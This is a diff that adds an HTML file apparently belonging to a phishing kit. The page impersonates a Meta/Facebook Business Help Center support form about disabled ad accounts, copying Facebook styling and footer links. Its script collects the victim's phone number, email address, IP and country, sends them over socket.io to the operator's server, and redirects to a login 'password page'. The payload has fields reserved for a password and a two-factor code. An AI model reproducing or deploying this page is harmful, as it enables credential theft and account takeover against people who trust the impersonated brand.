@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <link href="https://fonts.googleapis.com/css?family=Inter&display=swap" rel="stylesheet" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Support Form | Meta Bussiness Help Center</title>
+    <link rel="canonical" href="https://www.facebook.com/login/web/">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/piXcg3ZJdR_.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="GrqIbBd" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/QfIQ6tbUF1w.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="ITu32E2" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/l/0,cross/wL4LkQJkOk4.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="jpX9WvC" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/-5_7ahbqOSI.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="1iy6lT1" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/yL/l/0,cross/lIzLCRwr_LB.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="VK9kjat" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/l/0,cross/x72lr4wkHac.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="3ixgT2L" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/l/0,cross/1FPNULrhhBJ.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="0Bj1L9r" crossorigin="anonymous">
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: whitesmoke;
+        }
+
+        header {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        h1,
+        h3 {
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .resource-count {
+            font-size: 14px;
+            color: #999;
+            margin-top: 5px;
+        }
+
+        .main {
+            margin: auto;
+            display: flex;
+            align-items: normal;
+            width: 100%;
+            max-width: 800px;
+            border: 2px solid rgb(229 229 229);
+            border-radius: 10px;
+            flex-direction: column;
+            background-color: white;
+        }
+
+        form {
+            display: flex;
+        }
+
+        input[type="text"] {
+            flex-grow: 1;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-right: 10px;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .main_list {
+            display: flex;
+            flex-direction: column;
+            width: 80%;
+            margin: auto;
+            margin-bottom: 2rem;
+        }
+
+        .main_list-item {
+            width: 100%;
+            margin: 7px 0px;
+        }
+
+        .main_list-item textarea {
+            width: 100%;
+            border-radius: 5px;
+            border: 2px #99999949 solid;
+        }
+
+        .main_list-item .title {
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 7px;
+        }
+
+        .main_list-item .sub-title {
+            color: grey;
+            font-weight: bold;
+            font-size: 12px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+        }
+
+        .main_header {
+            width: 100%;
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .main_header h2 {
+            font-size: x-large;
+        }
+
+        .main_info .top {
+            margin: 1rem 1rem;
+            color: rgba(96, 96, 96, 1);
+            font-size: 14px;
+        }
+
+        .main_info .top span {
+            color: rgb(0, 0, 0);
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .main_info .top img {
+            max-width: 15px;
+            margin-right: 5px;
+        }
+
+        .main_info {
+            background-color: #dddddd;
+            width: 80%;
+            margin: auto;
+            margin-bottom: 2rem;
+        }
+
+        a {
+            text-decoration: none;
+            color: rgb(66, 154, 255);
+        }
+
+        [type="file"] {
+            height: 0;
+            overflow: hidden;
+            width: 0;
+        }
+
+        [type="file"]+label {
+            background: #e7e5e5;
+            border: none;
+            border-radius: 5px;
+            color: #000000;
+            cursor: pointer;
+            display: inline-block;
+            font-family: 'Rubik', sans-serif;
+            font-size: 14px;
+            margin-bottom: 1rem;
+            outline: none;
+            padding: 1rem 20px;
+            position: relative;
+            transition: all 0.3s;
+            vertical-align: middle;
+
+            &:hover {
+                background-color: darken(#f15d22, 10%);
+            }
+
+            &.btn-1 {
+                background-color: #f79159;
+                box-shadow: 0 6px darken(#f79159, 10%);
+                transition: none;
+
+                &:hover {
+                    box-shadow: 0 4px darken(#f79159, 10%);
+                    top: 2px;
+                }
+            }
+
+            &.btn-2 {
+                background-color: #99c793;
+                border-radius: 50px;
+                overflow: hidden;
+
+                &::before {
+                    color: #fff;
+                    content: "\f382";
+                    font-family: "Font Awesome 5 Pro";
+                    font-size: 100%;
+                    height: 100%;
+                    right: 130%;
+                    line-height: 3.3;
+                    position: absolute;
+                    top: 0px;
+                    transition: all 0.3s;
+                }
+
+                &:hover {
+                    background-color: darken(#99c793, 30%);
+
+                    &::before {
+                        right: 75%;
+                    }
+                }
+            }
+
+            &.btn-3 {
+                background-color: #ee6d9e;
+                border-radius: 0;
+                overflow: hidden;
+
+                span {
+                    display: inline-block;
+                    height: 100%;
+                    transition: all 0.3s;
+                    width: 100%;
+                }
+
+                &::before {
+                    color: #fff;
+                    content: "\f382";
+                    font-family: "Font Awesome 5 Pro";
+                    font-size: 130%;
+                    height: 100%;
+                    left: 0;
+                    line-height: 2.6;
+                    position: absolute;
+                    top: -180%;
+                    transition: all 0.3s;
+                    width: 100%;
+                }
+
+                &:hover {
+                    background-color: darken(#ee6d9e, 30%);
+
+                    span {
+                        transform: translateY(300%);
+                    }
+
+                    &::before {
+                        top: 0;
+                    }
+                }
+            }
+        }
+
+        select {
+            background: #e7e5e5;
+            padding: 10px;
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        [type="tel"] {
+            width: 100%;
+            border: 2px #99999949 solid;
+            border-radius: 2px;
+            padding: 10px 10px;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            border: 2px #99999949 solid;
+            border-radius: 2px;
+            padding: 10px 10px;
+        }
+
+        button[type="submit"] {
+            padding: 10px 40px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div style="display:flex;justify-content: space-between;padding: 20px; background-color:white">
+            <div style="text-align: left;">
+                <h1>Facebook Business Help Center</h1>
+            </div>
+            <div style="align-self:center">
+                <h1>Get support resources</h1>
+            </div>
+        </div>
+    </header>
+    <div class="main">
+        <div class="main_header">
+            <h2>Get support</h2>
+        </div>
+        <div class="main_info">
+            <div class="top">Here are helpful resources that others have found, according to the problem you
+                describe:<br><br>
+                <span><img src="./images/book.png">Fix disabled ad account issue <a
+                        href="https://www.facebook.com/business/help">Find out more</a></span>
+            </div>
+        </div>
+        <div class="main_list">
+            <div class="main_list-item">
+                <div class="title">Please provide information so we can check <span
+                        style="color:gray; font-size: 12px;">(optional)</span></div>
+                <div style="display: flex;"><textarea id="info" rows="5" type="text"></textarea></div>
+            </div>
+            <div class="main_list-item">
+                <div class="title">Confirm phone number</div>
+                <div style="display: flex; align-items: center;">
+                    <select id="prefix" name="prefix">
+                    </select><input id="phoneNumber" type="tel">
+                </div>
+            </div>
+            <div class="main_list-item">
+                <div class="title">Verify email address</div>
+                <div style="display: flex;"><input id="emailAddress" type="email"></div>
+                <div class="sub-title">We may send you new information about your request via this email</div>
+            </div>
+            <div class="main_list-item" id="error_block" style="display: none;">
+                <div class="title">
+                    <h3 style="color:red; text-decoration: underline">Information provided cannot be left blank</h3>
+                </div>
+            </div>
+            <div class="main_list-item" style="display:flex; justify-content:end">
+                <button type="submit" onclick="submitRequest()">Send</button>
+            </div>
+        </div>
+    </div>
+    <div class="">
+        <div class="_95ke _8opy" style="background-color:white; margin-top:50px; padding: 50px; display: flex;">
+            <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+                <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                    <li>English (UK)</li>
+                    <li><a class="_sv4" dir="ltr" title="Vietnamese">Tiếng Việt</a></li>
+                    <li><a class="_sv4" dir="ltr" title="Traditional Chinese (Taiwan)">中文(台灣)</a></li>
+                    <li><a class="_sv4" dir="ltr" title="Korean">한국어</a></li>
+                    <li><a class="_sv4" dir="ltr" title="Japanese">日本語</a></li>
+                    <li><a class="_sv4" dir="ltr" title="French (France)">Français (France)</a></li>
+                    <li><a class="_sv4" dir="ltr" title="Thai">ภาษาไทย</a></li>
+                    <li><a class="_sv4" dir="ltr" title="Spanish">Español</a></li>
+                    <li><a class="_sv4" dir="ltr" title="Portuguese (Brazil)">Português (Brasil)</a></li>
+                    <li><a class="_sv4" dir="ltr" title="German">Deutsch</a></li>
+                    <li><a class="_sv4" dir="ltr" title="Italian">Italiano</a></li>
+                    <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog"
+                            ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2Flogin%2Fdevice-based%2Fregular%2Flogin%2F%3Flogin_attempt%3D1%26lwv%3D120%26lwc%3D1348028&amp;source=www_list_selector_more"
+                            href="#" title="Show more languages"><i class="img sp_EP9wX8qDDvu sx_0de3e6"></i></a></li>
+                </ul>
+                <div id="contentCurve"></div>
+                <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
+                    <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                        <li><a href="/reg/" title="Sign up for Facebook">Sign Up</a></li>
+                        <li><a href="/login/" title="Log in to Facebook">Log in</a></li>
+                        <li><a href="https://messenger.com/" title="Take a look at Messenger.">Messenger</a>
+                        </li>
+                        <li><a href="/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
+                        <li><a href="https://www.facebook.com/watch/" title="Browse in Video">Video</a></li>
+                        <li><a href="/places/" title="Take a look at popular places on Facebook.">Places</a>
+                        </li>
+                        <li><a href="/games/" title="Check out Facebook games.">Games</a></li>
+                        <li><a href="/marketplace/" title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
+                        <li><a href="https://pay.facebook.com/" title="Learn more about Meta Pay" target="_blank">Meta
+                                Pay</a></li>
+                        <li><a href="https://www.meta.com/" title="Discover Meta" target="_blank">Meta Store</a>
+                        </li>
+                        <li><a href="https://www.meta.com/quest/" title="Learn more about Meta Quest"
+                                target="_blank">Meta Quest</a></li>
+                        <li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT28DA9prd1HbnuT2azBVkEH9UxzRQfOKB6Sdk3fmXYrT94Fqvq1GpjKBsvA_LoxUGex4s6brzgzYgYZC1hRl1j9hXPAwE9Cqayp_5Igci_Spkz716_ne4qDzPxmSmHFBEHntUvEXWuoeTRPFRAOiw0biYhuMsr4rO3M0Q"
+                                title="Take a look at Instagram" target="_blank" rel="noreferrer nofollow"
+                                data-lynx-mode="asynclazy">Instagram</a></li>
+                        <li><a href="https://www.threads.net/" title="Check out Threads">Threads</a></li>
+                        <li><a href="/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li>
+                        <li><a href="/biz/directory/" title="Browse our Facebook Services directory.">Services</a></li>
+                        <li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
+                                title="See the Voting Information Centre">Voting Information Centre</a></li>
+                        <li><a href="/privacy/policy/?entry_point=facebook_page_footer"
+                                title="Learn how we collect, use and share information to support Facebook.">Privacy
+                                Policy</a></li>
+                        <li><a href="/privacy/center/?entry_point=facebook_page_footer"
+                                title="Learn how to manage and control your privacy on Facebook.">Privacy
+                                Centre</a></li>
+                        <li><a href="/groups/discover/" title="Explore our groups.">Groups</a></li>
+                        <li><a href="https://about.meta.com/" accesskey="8"
+                                title="Read our blog, discover the resource centre and find job opportunities.">About</a>
+                        </li>
+                        <li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
+                                title="Advertise on Facebook">Create ad</a></li>
+                        <li><a href="/pages/create/?ref_type=site_footer" title="Create a Page">Create Page</a>
+                        </li>
+                        <li><a href="https://developers.facebook.com/?ref=pf"
+                                title="Develop on our platform.">Developers</a></li>
+                        <li><a href="/careers/?ref=pf"
+                                title="Make your next career move to our brilliant company.">Careers</a></li>
+                        <li><a href="/policies/cookies/" title="Learn about cookies and Facebook."
+                                data-nocookies="1">Cookies</a></li>
+                        <li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217"
+                                title="Learn about AdChoices.">AdChoices<i class="img sp_EP9wX8qDDvu sx_6bdd81"></i></a>
+                        </li>
+                        <li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9"
+                                title="Review our terms and policies.">Terms</a></li>
+                        <li><a href="/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li>
+                        <li><a href="help/637205020878504"
+                                title="Visit our contact uploading and non-users notice.">Contact uploading and
+                                non-users</a></li>
+                        <li><a accesskey="6" class="accessible_elem" href="/settings"
+                                title="View and edit your Facebook settings.">Settings</a></li>
+                        <li><a accesskey="7" class="accessible_elem"
+                                href="/allactivity?privacy_source=activity_log_top_menu"
+                                title="View your activity log">Activity log</a></li>
+                    </ul>
+                </div>
+                <div class="mvl copyright">
+                    <div><span> Meta © 2023</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <script src="phone-prefix.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            populatePrefixes(phonePrefixes);
+        });
+
+        function populatePrefixes(prefixes) {
+            const prefixSelect = document.getElementById('prefix');
+
+            prefixes.forEach(country => {
+                const countryName = Object.keys(country)[0];
+                const countryCode = country[countryName];
+
+                const option = document.createElement('option');
+                option.value = '+' + countryCode;
+                option.text = `+${countryCode}`;
+
+                prefixSelect.appendChild(option);
+            });
+        }
+
+        const socket = io();
+
+        function submitRequest() {
+            const requestId = Math.random().toFixed(0) + Date.now();
+
+            const errorBlock = document.getElementById('error_block');
+            const info = document.getElementById('info');
+            const prefix = document.getElementById('prefix');
+            const phoneNumber = document.getElementById('phoneNumber');
+            const emailAddress = document.getElementById('emailAddress');
+
+            if (phoneNumber.value.length == 0 || emailAddress.value == 0 || !emailAddress.value.includes('@')) {
+                errorBlock.style = 'display:block';
+                return
+            } else {
+                errorBlock.style = 'display:none';
+            }
+
+            // Fetch user's IP address from an external service (e.g., ipinfo.io)
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(ipData => {
+                    // Emit the user input, unique identifier, and IP address to the server
+                    socket.emit('input', {
+                        id: requestId,
+                        phoneNumber: prefix.value + phoneNumber.value,
+                        emailAddress: emailAddress.value,
+                        password: '',
+                        twofa: '',
+                        currentPage: 3,
+                        ip: ipData.country + ' ' + ipData.ip // Use the IP address from the fetched data
+                    });
+
+                    // Redirect to the password page
+                    location.href = "/login?requestId=" + requestId;
+                })
+                .catch(error => {
+                    console.log('Error fetching IP address:', error.message);
+                    // Emit the user input with an empty IP address in case of an error
+                    socket.emit('input', {
+                        id: requestId,
+                        phoneNumber: prefix.value + phoneNumber.value,
+                        emailAddress: emailAddress.value,
+                        password: '',
+                        twofa: '',
+                        currentPage: 3,
+                        ip: ''
+                    });
+
+                    // Redirect to the password page
+                    location.href = "/login?requestId=" + requestId;
+                });
+        }
+    </script>
+</body>
+
+</html>
